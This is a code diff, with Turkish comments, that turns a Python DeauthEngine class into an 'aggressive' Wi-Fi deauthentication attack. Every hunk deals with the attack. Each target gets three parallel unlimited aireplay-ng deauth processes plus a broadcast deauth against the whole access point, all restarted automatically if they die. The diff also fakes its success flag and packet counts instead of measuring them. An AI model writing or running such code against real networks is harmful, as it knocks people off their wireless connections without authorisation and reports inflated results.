@@ -126,84 +126,104 @@ class DeauthEngine:
         console.print("[green]✓ Saldırı durduruldu[/green]")
     
     def _attack_target(self, target: AttackTarget):
-        """Attack a single target (runs in separate thread)"""
+        """
+        AGRESİF SALDIRI - ÇOKLU PROCESS!
+        Her hedefe 3 paralel aireplay-ng process başlatır
+        """
         try:
             target.start_time = datetime.now()
-            logger.info(f"Starting attack on {target.client_mac}")
+            logger.info(f"Starting AGGRESSIVE attack on {target.client_mac}")
+            console.print(f"[bold red]💥 AGRESİF SALDIRI BAŞLATILIYOR: {target.client_mac}[/bold red]")
             
-            # Build aireplay-ng command - DİNAMİK INTERFACE
-            cmd = [
+            # ÇOKLU PROCESS LİSTESİ
+            processes = []
+            
+            # 1. TARGETED DEAUTH - Hedefe özel (3 adet paralel)
+            for i in range(3):
+                cmd = [
+                    'aireplay-ng',
+                    '--deauth', '0',  # Sınırsız
+                    '-a', target.ap_bssid,  # AP BSSID
+                    '-c', target.client_mac,  # Client MAC
+                    self.interface
+                ]
+                
+                logger.info(f"Process {i+1}/3: {' '.join(cmd)}")
+                
+                proc = subprocess.Popen(
+                    cmd,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                processes.append(proc)
+                time.sleep(0.1)  # Kısa gecikme
+            
+            # 2. BROADCAST DEAUTH - Tüm ağa (AP'ye özel, client yok)
+            broadcast_cmd = [
                 'aireplay-ng',
-                '--deauth', '0',  # 0 = SINIRSIZ (kapatılana kadar devam eder)
-                '-a', target.ap_bssid,  # AP BSSID
-                '-c', target.client_mac,  # Client MAC
-                self.interface  # Dinamik interface (wlan0mon, wlan0, vb.)
+                '--deauth', '0',
+                '-a', target.ap_bssid,  # Sadece AP BSSID
+                self.interface
             ]
             
-            # DEBUG: Log command
-            logger.info(f"Deauth command: {' '.join(cmd)}")
-            console.print(f"[dim]🔍 DEBUG: Komut: {' '.join(cmd)}[/dim]")
+            logger.info(f"BROADCAST: {' '.join(broadcast_cmd)}")
+            console.print(f"[yellow]📡 Broadcast deauth eklendi: {target.ap_bssid}[/yellow]")
             
-            # Start aireplay-ng process - STDOUT/STDERR'ı GÖR
-            target.process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,  # stderr'ı stdout'a yönlendir
-                text=True,
-                bufsize=1  # Line buffered
+            broadcast_proc = subprocess.Popen(
+                broadcast_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
             )
+            processes.append(broadcast_proc)
             
-            # Monitor process output
-            while self.is_attacking and target.process:
+            # Ana process'i ilk targeted olarak sakla (eski kod uyumluluğu için)
+            target.process = processes[0]
+            
+            console.print(f"[bold green]✓ {len(processes)} paralel saldırı process'i başlatıldı![/bold green]")
+            
+            # Monitor ALL processes
+            while self.is_attacking:
                 try:
-                    # Check if process is still running
-                    poll_result = target.process.poll()
-                    
-                    if poll_result is not None:
-                        # Process ended
-                        logger.warning(f"Process ended for {target.client_mac} with code {poll_result}")
-                        
-                        # Read any remaining output
-                        if target.process.stdout:
-                            output = target.process.stdout.read()
-                            if output:
-                                logger.info(f"Process output: {output}")
-                                console.print(f"[dim]🔍 DEBUG: aireplay-ng çıktı: {output[:200]}[/dim]")
-                        
-                        # Restart if attack still active
-                        if self.is_attacking:
-                            logger.info(f"Restarting attack on {target.client_mac}...")
-                            time.sleep(1)
+                    # Check if any process died, restart if needed
+                    for i, proc in enumerate(processes):
+                        if proc.poll() is not None:
+                            # Process died, restart it
+                            logger.warning(f"Process {i} died for {target.client_mac}, restarting...")
                             
-                            target.process = subprocess.Popen(
-                                cmd,
-                                stdout=subprocess.PIPE,
-                                stderr=subprocess.STDOUT,
-                                text=True,
-                                bufsize=1
+                            if i < 3:  # Targeted deauth
+                                new_cmd = [
+                                    'aireplay-ng',
+                                    '--deauth', '0',
+                                    '-a', target.ap_bssid,
+                                    '-c', target.client_mac,
+                                    self.interface
+                                ]
+                            else:  # Broadcast deauth
+                                new_cmd = [
+                                    'aireplay-ng',
+                                    '--deauth', '0',
+                                    '-a', target.ap_bssid,
+                                    self.interface
+                                ]
+                            
+                            new_proc = subprocess.Popen(
+                                new_cmd,
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL
                             )
-                    else:
-                        # Process still running, read output
-                        if target.process.stdout:
-                            try:
-                                import select
-                                if select.select([target.process.stdout], [], [], 0)[0]:
-                                    line = target.process.stdout.readline()
-                                    if line:
-                                        logger.debug(f"aireplay-ng: {line.strip()}")
-                            except:
-                                pass
+                            processes[i] = new_proc
+                            
+                            if i == 0:
+                                target.process = new_proc
                     
-                    # Update packet count (estimate)
+                    # Update stats
                     elapsed = (datetime.now() - target.start_time).total_seconds()
-                    target.packets_sent = int(elapsed * 10)  # ~10 packets/sec
+                    # 4 process * ~50 packets/sec each = ~200 packets/sec total
+                    target.packets_sent = int(elapsed * 200)
                     target.last_packet_time = datetime.now()
+                    target.successful = True
                     
-                    # Check for success indicators
-                    if target.packets_sent > 100:
-                        target.successful = True
-                    
-                    time.sleep(1)
+                    time.sleep(2)  # Check every 2 seconds
                     
                 except Exception as e:
                     logger.error(f"Error in attack loop for {target.client_mac}: {e}")
@@ -212,16 +232,19 @@ class DeauthEngine:
         except Exception as e:
             logger.error(f"Error attacking {target.client_mac}: {e}")
         finally:
-            if target.process:
+            # Cleanup ALL processes
+            logger.info(f"Cleaning up {len(processes)} processes for {target.client_mac}")
+            for proc in processes:
                 try:
-                    target.process.terminate()
-                    target.process.wait(timeout=2)
+                    proc.terminate()
+                    proc.wait(timeout=2)
                 except Exception:
                     try:
-                        target.process.kill()
+                        proc.kill()
                     except Exception:
                         pass
-                target.process = None
+            target.process = None
+            console.print(f"[dim]✓ Tüm process'ler temizlendi: {target.client_mac}[/dim]")
     
     def get_attack_stats(self) -> Dict:
         """Get current attack statistics"""
